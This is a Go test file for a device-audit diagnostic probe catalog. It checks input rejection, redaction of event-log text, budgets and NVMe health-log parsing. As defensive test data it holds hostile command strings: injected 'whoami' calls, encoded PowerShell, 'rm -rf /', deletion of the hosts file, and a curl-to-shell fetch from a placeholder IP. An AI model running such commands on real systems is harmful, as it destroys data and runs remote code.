package workflows

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"errors"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/i-got-this-faa/device-audit/packages/contracts"
	"github.com/i-got-this-faa/device-audit/packages/telemetry"
)

var fixedNow = time.Date(2026, 11, 18, 12, 0, 0, 0, time.UTC)

// recorder logs every provider call so tests can prove what ran.
type recorder struct {
	mu    sync.Mutex
	calls []string
}

func (r *recorder) add(call string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.calls = append(r.calls, call)
}

func (r *recorder) list() []string {
	r.mu.Lock()
	defer r.mu.Unlock()
	return append([]string(nil), r.calls...)
}

type fakeDisks struct {
	*recorder
	health StorageHealth
	err    error
	block  bool
}

func (f fakeDisks) Health(ctx context.Context, n int) (StorageHealth, error) {
	f.add("disk:" + StorageComponentID(n))
	if f.block {
		<-ctx.Done()
		return StorageHealth{}, ctx.Err()
	}
	return f.health, f.err
}

type fakeEvents struct {
	*recorder
	events map[string][]telemetry.RawEvent
	denied map[string]bool
	// stall, when set, blocks Bounds until closed and ignores ctx, like an
	// event-log call without its own timeout.
	stall chan struct{}
}

func (f fakeEvents) Bounds(_ context.Context, log string) (telemetry.LogBounds, error) {
	f.add("bounds:" + log)
	if f.stall != nil {
		<-f.stall
	}
	if f.denied[log] {
		return telemetry.LogBounds{}, telemetry.ErrPermissionDenied
	}
	if len(f.events[log]) == 0 {
		return telemetry.LogBounds{Empty: true}, nil
	}
	last := f.events[log][len(f.events[log])-1]
	return telemetry.LogBounds{Oldest: f.events[log][0].RecordID, Newest: last.RecordID, NewestTime: last.TimeCreated}, nil
}

func (f fakeEvents) RecordTime(_ context.Context, log string, id uint64) (time.Time, bool, error) {
	f.add("record_time:" + log)
	return time.Time{}, false, nil
}

func (f fakeEvents) ReadErrors(_ context.Context, log string, after uint64, since time.Time, limit int) ([]telemetry.RawEvent, error) {
	f.add("read:" + log)
	var out []telemetry.RawEvent
	for _, e := range f.events[log] {
		if e.RecordID > after && !e.TimeCreated.Before(since) && len(out) < limit {
			out = append(out, e)
		}
	}
	return out, nil
}

func ptr[T any](v T) *T { return &v }

func storageRequest(component string) Request {
	return Request{ProbeID: contracts.DiagnosticProbeStorageHealthV1, Arguments: contracts.DiagnosticArgumentsV1{ComponentID: &component},
		Budget: contracts.DiagnosticBudgetV1{WallSeconds: 30, MaxOutputBytes: 4096}}
}

func errorsRequest(lookback, entries uint32) Request {
	return Request{ProbeID: contracts.DiagnosticProbeSystemErrorsV1, Arguments: contracts.DiagnosticArgumentsV1{LookbackSeconds: &lookback, MaxEntries: &entries},
		Budget: contracts.DiagnosticBudgetV1{WallSeconds: 30, MaxOutputBytes: 65536}}
}

func testCatalog(rec *recorder, disks fakeDisks, events fakeEvents) Catalog {
	disks.recorder, events.recorder = rec, rec
	return Catalog{Disks: disks, Events: events, Now: func() time.Time { return fixedNow }}
}

// Unknown probes, shell input, paths and malformed arguments are rejected
// before any provider runs.
func TestCatalogRejectsUnknownProbesAndShellInput(t *testing.T) {
	const budget = `"budget":{"wall_seconds":30,"max_output_bytes":4096}`
	const errArgs = `"arguments":{"component_id":null,"lookback_seconds":60,"max_entries":8}`
	for name, wire := range map[string]string{
		"unknown probe":           `{"probe_id":"process_list.v1",` + errArgs + `,` + budget + `}`,
		"shell as probe":          `{"probe_id":"cmd.exe /c whoami",` + errArgs + `,` + budget + `}`,
		"script as probe":         `{"probe_id":"powershell -enc SQBFAFgA",` + errArgs + `,` + budget + `}`,
		"empty probe":             `{"probe_id":"",` + errArgs + `,` + budget + `}`,
		"top-level command":       `{"probe_id":"system_errors.v1",` + errArgs + `,` + budget + `,"command":"whoami"}`,
		"argument command":        `{"probe_id":"system_errors.v1","arguments":{"component_id":null,"lookback_seconds":60,"max_entries":8,"command":"whoami"},` + budget + `}`,
		"argument shell":          `{"probe_id":"storage_health.v1","arguments":{"component_id":"storage:disk-0","lookback_seconds":null,"max_entries":null,"shell":"cmd"},` + budget + `}`,
		"budget script":           `{"probe_id":"system_errors.v1",` + errArgs + `,"budget":{"wall_seconds":30,"max_output_bytes":4096,"script":"x"}}`,
		"path component":          `{"probe_id":"storage_health.v1","arguments":{"component_id":"C:\\Windows\\System32","lookback_seconds":null,"max_entries":null},` + budget + `}`,
		"device path component":   `{"probe_id":"storage_health.v1","arguments":{"component_id":"\\\\.\\PhysicalDrive0","lookback_seconds":null,"max_entries":null},` + budget + `}`,
		"chained component":       `{"probe_id":"storage_health.v1","arguments":{"component_id":"storage:disk-0 & whoami","lookback_seconds":null,"max_entries":null},` + budget + `}`,
		"mixed arguments":         `{"probe_id":"system_errors.v1","arguments":{"component_id":"storage:disk-0","lookback_seconds":60,"max_entries":8},` + budget + `}`,
		"missing argument key":    `{"probe_id":"system_errors.v1","arguments":{"lookback_seconds":60,"max_entries":8},` + budget + `}`,
		"lookback too long":       `{"probe_id":"system_errors.v1","arguments":{"component_id":null,"lookback_seconds":86401,"max_entries":8},` + budget + `}`,
		"too many entries":        `{"probe_id":"system_errors.v1","arguments":{"component_id":null,"lookback_seconds":60,"max_entries":257},` + budget + `}`,
		"string lookback":         `{"probe_id":"system_errors.v1","arguments":{"component_id":null,"lookback_seconds":"60; whoami","max_entries":8},` + budget + `}`,
		"wall budget too long":    `{"probe_id":"system_errors.v1",` + errArgs + `,"budget":{"wall_seconds":301,"max_output_bytes":4096}}`,
		"zero output budget":      `{"probe_id":"system_errors.v1",` + errArgs + `,"budget":{"wall_seconds":30,"max_output_bytes":0}}`,
		"trailing document":       `{"probe_id":"system_errors.v1",` + errArgs + `,` + budget + `} {"probe_id":"shell"}`,
		"oversized request":       `{"probe_id":"system_errors.v1",` + errArgs + `,` + budget + `,"pad":"` + strings.Repeat("a", MaxRequestBytes) + `"}`,
		"array instead of object": `["system_errors.v1"]`,
	} {
		t.Run(name, func(t *testing.T) {
			if _, err := ParseRequest(strings.NewReader(wire)); err == nil {
				t.Fatalf("accepted %s", wire)
			}
		})
	}
	rec := &recorder{}
	catalog := testCatalog(rec, fakeDisks{}, fakeEvents{})
	for _, req := range []Request{
		{ProbeID: "shell.v1", Budget: contracts.DiagnosticBudgetV1{WallSeconds: 1, MaxOutputBytes: 1}},
		storageRequest("C:\\x"),
		{ProbeID: contracts.DiagnosticProbeStorageHealthV1, Arguments: contracts.DiagnosticArgumentsV1{ComponentID: ptr("storage:disk-0"), MaxEntries: ptr(uint32(1))}, Budget: contracts.DiagnosticBudgetV1{WallSeconds: 1, MaxOutputBytes: 1}},
	} {
		var failure *Failure
		if _, err := catalog.Run(context.Background(), req); err == nil || errors.As(err, &failure) {
			t.Fatalf("%+v: want a request rejection, got %v", req, err)
		}
	}
	if _, err := catalog.Run(context.Background(), Request{ProbeID: "shell.v1"}); !errors.Is(err, contracts.ErrDiagnosticProbeNotAllowlisted) {
		t.Fatalf("unknown probe error = %v", err)
	}
	// Well-formed opaque IDs that do not name a local disk never reach the reader.
	for _, id := range []string{"storage-a", "storage:disk-64", "storage:disk-01", "storage:disk-99"} {
		_, err := catalog.Run(context.Background(), storageRequest(id))
		var failure *Failure
		if !errors.As(err, &failure) || failure.Reason != ReasonProbeError || failure.Detail != "component_not_found" {
			t.Fatalf("%s: got %v", id, err)
		}
	}
	if calls := rec.list(); len(calls) != 0 {
		t.Fatalf("rejected requests reached providers: %v", calls)
	}
}

// Event text is attacker-influenced. Messages never appear in evidence and a
// provider name outside the publisher-name form is reduced to its digest.
func TestSystemErrorsOmitsCommandLikeLogContent(t *testing.T) {
	hostile := []string{
		"powershell -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
		"cmd.exe /c del /q C:\\Windows\\System32\\drivers\\etc\\hosts && curl http://198.51.100.7/x | sh",
		"$(rm -rf /); `id`",
	}
	at := fixedNow.Add(-time.Minute)
	events := fakeEvents{events: map[string][]telemetry.RawEvent{
		telemetry.LogSystem: {
			{RecordID: 10, Provider: "Service Control Manager", EventID: 7031, Level: 2, TimeCreated: at, Message: hostile[0], MessageStatus: telemetry.MessageComplete},
			{RecordID: 11, Provider: "cmd.exe /c whoami", EventID: 1, Level: 1, TimeCreated: at, Message: hostile[1], MessageStatus: telemetry.MessageComplete},
		},
		telemetry.LogApplication: {
			{RecordID: 5, Provider: "Application Error", EventID: 1000, Level: 2, TimeCreated: at, Message: hostile[2], MessageStatus: telemetry.MessageComplete},
			// Publisher-shaped but unregistered: anyone can log under this name.
			{RecordID: 6, Provider: "powershell -enc ZQBjAGgAbwAg", EventID: 0, Level: 2, TimeCreated: at, MessageStatus: telemetry.MessageUnavailable},
		},
	}}
	rec := &recorder{}
	encoded, err := testCatalog(rec, fakeDisks{}, events).Run(context.Background(), errorsRequest(3600, 8))
	if err != nil {
		t.Fatal(err)
	}
	for _, text := range append(hostile, "powershell", "ZQBjAGgAbwAg", "cmd.exe", "whoami", "curl", "rm -rf", "System32") {
		if strings.Contains(string(encoded), text) {
			t.Fatalf("evidence carries log text %q: %s", text, encoded)
		}
	}
	var evidence Evidence[SystemErrors]
	if err := json.Unmarshal(encoded, &evidence); err != nil {
		t.Fatal(err)
	}
	if evidence.Schema != ProbeEvidenceSchema || evidence.ProbeID != contracts.DiagnosticProbeSystemErrorsV1 || evidence.Source != telemetry.ProvenanceEndpointEventLog || !evidence.ObservedAt.Equal(fixedNow) {
		t.Fatalf("evidence header = %+v", evidence)
	}
	system := evidence.Body.Logs[0].Records
	if len(system) != 2 || system[0].Provider == nil || *system[0].Provider != "Service Control Manager" || system[1].Provider != nil {
		t.Fatalf("provider handling = %+v", system)
	}
	if system[1].ProviderSHA256 != digest("cmd.exe /c whoami") || system[0].MessageSHA256 != digest(hostile[0]) || system[0].MessageBytes != len(hostile[0]) {
		t.Fatalf("digests = %+v", system)
	}
	application := evidence.Body.Logs[1].Records
	if len(application) != 2 || application[0].Provider == nil || application[1].Provider != nil || application[1].ProviderSHA256 != digest("powershell -enc ZQBjAGgAbwAg") {
		t.Fatalf("unregistered provider handling = %+v", application)
	}
}

// max_entries bounds each log's read; the cut is reported, not hidden.
func TestSystemErrorsHonoursLookbackAndMaxEntries(t *testing.T) {
	var system []telemetry.RawEvent
	for i := range 5 {
		system = append(system, telemetry.RawEvent{RecordID: uint64(i + 1), Provider: "disk", EventID: 7, Level: 2,
			TimeCreated: fixedNow.Add(time.Duration(i-3) * time.Hour), Message: "bad block", MessageStatus: telemetry.MessageComplete})
	}
	rec := &recorder{}
	encoded, err := testCatalog(rec, fakeDisks{}, fakeEvents{events: map[string][]telemetry.RawEvent{telemetry.LogSystem: system}}).Run(context.Background(), errorsRequest(2*3600+1, 2))
	if err != nil {
		t.Fatal(err)
	}
	var evidence Evidence[SystemErrors]
	if err := json.Unmarshal(encoded, &evidence); err != nil {
		t.Fatal(err)
	}
	got := evidence.Body.Logs[0]
	// Lookback admits records 2..5 (three hours ago is outside); two fit.
	if len(got.Records) != 2 || got.Records[0].RecordID != 2 || !got.More || evidence.Body.MaxEntries != 2 {
		t.Fatalf("bounded read = %+v", got)
	}
}

// A denied provider is an explicit permission_denied failure. The catalog
// does not retry, read further from the denied log or write any state.
func TestDeniedProbePermissionsFailWithoutSideEffects(t *testing.T) {
	rec := &recorder{}
	events := fakeEvents{denied: map[string]bool{telemetry.LogSystem: true}, events: map[string][]telemetry.RawEvent{
		telemetry.LogApplication: {{RecordID: 3, Provider: "Application Error", EventID: 1000, Level: 2, TimeCreated: fixedNow, Message: "x", MessageStatus: telemetry.MessageComplete}},
	}}
	_, err := testCatalog(rec, fakeDisks{}, events).Run(context.Background(), errorsRequest(3600, 8))
	var failure *Failure
	if !errors.As(err, &failure) || failure.Reason != ReasonPermissionDenied || failure.Detail != "event_log_access_denied" {
		t.Fatalf("denied log = %v", err)
	}
	var partial Evidence[SystemErrors]
	if err := json.Unmarshal(failure.Partial, &partial); err != nil || partial.Body.Logs[0].Outcome != telemetry.LogPermissionDenied || len(partial.Body.Logs[1].Records) != 1 {
		t.Fatalf("partial evidence = %s (%v)", failure.Partial, err)
	}
	if got, want := strings.Join(rec.list(), ","), "bounds:System,bounds:Application,read:Application"; got != want {
		t.Fatalf("calls = %s, want %s", got, want)
	}

	rec = &recorder{}
	_, err = testCatalog(rec, fakeDisks{err: telemetry.ErrPermissionDenied}, fakeEvents{}).Run(context.Background(), storageRequest("storage:disk-0"))
	if !errors.As(err, &failure) || failure.Reason != ReasonPermissionDenied || failure.Detail != "storage_access_denied" || failure.Partial != nil {
		t.Fatalf("denied disk = %v", err)
	}
	if got := rec.list(); len(got) != 1 {
		t.Fatalf("denied disk was retried: %v", got)
	}
}

func TestStorageHealthEvidence(t *testing.T) {
	health := StorageHealth{BusType: "nvme", NVMe: &NVMeHealth{AvailableSparePercent: 100, PercentageUsed: 18, TemperatureCelsius: ptr(53)}}
	rec := &recorder{}
	encoded, err := testCatalog(rec, fakeDisks{health: health}, fakeEvents{}).Run(context.Background(), storageRequest("storage:disk-0"))
	if err != nil {
		t.Fatal(err)
	}
	var evidence Evidence[StorageHealth]
	if err := json.Unmarshal(encoded, &evidence); err != nil {
		t.Fatal(err)
	}
	if evidence.Source != SourceStorageIOCTL || !evidence.ObservedAt.Equal(fixedNow) || evidence.Body.ComponentID != "storage:disk-0" || evidence.Body.NVMe.PercentageUsed != 18 {
		t.Fatalf("evidence = %s", encoded)
	}
	if got := rec.list(); len(got) != 1 || got[0] != "disk:storage:disk-0" {
		t.Fatalf("calls = %v", got)
	}

	_, err = testCatalog(&recorder{}, fakeDisks{err: ErrComponentNotFound}, fakeEvents{}).Run(context.Background(), storageRequest("storage:disk-1"))
	var failure *Failure
	if !errors.As(err, &failure) || failure.Detail != "component_not_found" {
		t.Fatalf("absent disk = %v", err)
	}
}

func TestBudgetsBoundTheProbe(t *testing.T) {
	req := storageRequest("storage:disk-0")
	req.Budget.MaxOutputBytes = 64
	_, err := testCatalog(&recorder{}, fakeDisks{health: StorageHealth{BusType: "sata", MissingReason: "not_applicable"}}, fakeEvents{}).Run(context.Background(), req)
	var failure *Failure
	if !errors.As(err, &failure) || failure.Reason != ReasonBudgetExhausted || failure.Detail != "output_budget" {
		t.Fatalf("output budget = %v", err)
	}
	req = storageRequest("storage:disk-0")
	req.Budget.WallSeconds = 1
	start := time.Now()
	_, err = testCatalog(&recorder{}, fakeDisks{block: true}, fakeEvents{}).Run(context.Background(), req)
	if !errors.As(err, &failure) || failure.Reason != ReasonBudgetExhausted || failure.Detail != "wall_budget" || time.Since(start) > 5*time.Second {
		t.Fatalf("wall budget = %v after %s", err, time.Since(start))
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := testCatalog(&recorder{}, fakeDisks{block: true}, fakeEvents{}).Run(ctx, storageRequest("storage:disk-0")); !errors.Is(err, context.Canceled) {
		t.Fatalf("cancelled run = %v", err)
	}

	// A stalled event-log call that ignores its context cannot hold the probe,
	// and no later log read starts after the deadline.
	stall := make(chan struct{})
	defer close(stall)
	rec := &recorder{}
	events := errorsRequest(60, 8)
	events.Budget.WallSeconds = 1
	start = time.Now()
	_, err = testCatalog(rec, fakeDisks{}, fakeEvents{stall: stall}).Run(context.Background(), events)
	if !errors.As(err, &failure) || failure.Detail != "wall_budget" || time.Since(start) > 5*time.Second {
		t.Fatalf("stalled event log = %v after %s", err, time.Since(start))
	}
	if got := rec.list(); len(got) != 1 || got[0] != "bounds:System" {
		t.Fatalf("calls after the deadline = %v", got)
	}

	// A result completed after the wall budget is not a success.
	late := testCatalog(&recorder{}, fakeDisks{health: StorageHealth{BusType: "nvme"}}, fakeEvents{})
	late.Now = func() time.Time { time.Sleep(1100 * time.Millisecond); return fixedNow }
	req = storageRequest("storage:disk-0")
	req.Budget.WallSeconds = 1
	if _, err := late.Run(context.Background(), req); !errors.As(err, &failure) || failure.Detail != "wall_budget" {
		t.Fatalf("late success = %v", err)
	}
}

func TestParseNVMeHealthLog(t *testing.T) {
	log := make([]byte, NVMeHealthLogBytes)
	log[0], log[3], log[4], log[5] = 0x04, 97, 10, 18
	binary.LittleEndian.PutUint16(log[1:], 326)
	binary.LittleEndian.PutUint64(log[128:], 4321)
	binary.LittleEndian.PutUint64(log[144:], 12)
	binary.LittleEndian.PutUint64(log[160:], 0)
	binary.LittleEndian.PutUint64(log[176:], 3)
	binary.LittleEndian.PutUint32(log[192:], 7)
	binary.LittleEndian.PutUint32(log[196:], 1)
	h, err := ParseNVMeHealthLog(log)
	if err != nil {
		t.Fatal(err)
	}
	if h.CriticalWarningFlags != 4 || *h.TemperatureCelsius != 53 || h.AvailableSparePercent != 97 || h.SpareThresholdPercent != 10 || h.PercentageUsed != 18 ||
		h.PowerOnHours != 4321 || h.UnsafeShutdowns != 12 || h.ErrorLogEntries != 3 || h.WarningTemperatureMins != 7 || h.CriticalTemperatureMins != 1 {
		t.Fatalf("parsed = %+v", h)
	}
	binary.LittleEndian.PutUint16(log[1:], 0)
	if h, _ := ParseNVMeHealthLog(log); h.TemperatureCelsius != nil {
		t.Fatal("zero kelvin must be null")
	}
	binary.LittleEndian.PutUint64(log[168:], 1)
	if _, err := ParseNVMeHealthLog(log); err == nil {
		t.Fatal("accepted a counter above 64 bits")
	}
	if _, err := ParseNVMeHealthLog(log[:511]); err == nil {
		t.Fatal("accepted a short log")
	}
}
